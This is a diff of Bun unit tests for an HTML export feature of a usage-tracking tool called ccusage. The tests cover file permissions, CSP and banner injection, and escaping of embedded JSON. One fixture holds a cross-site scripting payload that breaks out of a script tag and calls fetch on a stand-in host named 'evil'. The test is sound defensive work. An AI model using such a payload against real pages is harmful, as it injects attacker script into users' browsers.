@@ -1,7 +1,9 @@
 import { describe, expect, test } from "bun:test";
+import { mkdtempSync, rmSync, statSync } from "node:fs";
+import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { UsageData } from "./types";
-import { buildExportedHtml, exportOutputPath } from "./export";
+import { buildExportedHtml, exportOutputPath, writeExportedHtml } from "./export";
 
 const HTML = [
   "<!doctype html><html><head><title>ccusage</title></head><body>",
@@ -44,6 +46,17 @@ function extractEmbeddedJson(out: string): string {
 describe("exportOutputPath", () => {
   test("出力先は実行時カレントの dist/ccusage-ledger.html", () => {
     expect(exportOutputPath("/tmp/work")).toBe(join("/tmp/work", "dist", "ccusage-ledger.html"));
+  });
+});
+
+describe("writeExportedHtml", () => {
+  test("出力ファイルのパーミッションを 0600 にする", () => {
+    const dir = mkdtempSync(join(tmpdir(), "ccusage-export-"));
+    const out = join(dir, "dist", "ccusage-ledger.html");
+    writeExportedHtml(out, "<html>test</html>");
+    const mode = statSync(out).mode & 0o777;
+    expect(mode).toBe(0o600);
+    rmSync(dir, { recursive: true, force: true });
   });
 });
 
@@ -92,5 +105,37 @@ describe("buildExportedHtml", () => {
   test("エクスポート HTML にデータ取り扱いの警告バナーを注入する", () => {
     const out = buildExportedHtml(HTML, "chart", "bundle", DATA);
     expect(out).toContain("このファイルには ccusage の使用量データが含まれます");
+  });
+
+  test("</head> が無い HTML では例外を投げる（CSP 注入が静かに失われない）", () => {
+    expect(() => buildExportedHtml("<html><body></body></html>", "chart", "bundle", DATA)).toThrow();
+  });
+
+  test("<body> が無い HTML では例外を投げる（バナー注入が静かに失われない）", () => {
+    expect(() => buildExportedHtml("<html><head></head></html>", "chart", "bundle", DATA)).toThrow();
+  });
+
+  test("データに script 終了タグが複数あっても埋め込みにリテラルの < を残さない", () => {
+    const data: UsageData = {
+      ...DATA,
+      daily: [
+        {
+          ...DATA.daily![0]!,
+          modelBreakdowns: [
+            {
+              modelName: '</script><script>fetch("//evil/x")</script><img src=x onerror=alert(1)>',
+              cost: 1,
+              inputTokens: 1,
+              outputTokens: 1,
+              cacheReadTokens: 0,
+              cacheCreationTokens: 0,
+            },
+          ],
+        },
+      ],
+    };
+    const out = buildExportedHtml(HTML, "chart", "bundle", data);
+    expect(embeddedScriptContent(out)).not.toContain("<");
+    expect(JSON.parse(extractEmbeddedJson(out))).toEqual(data);
   });
 });
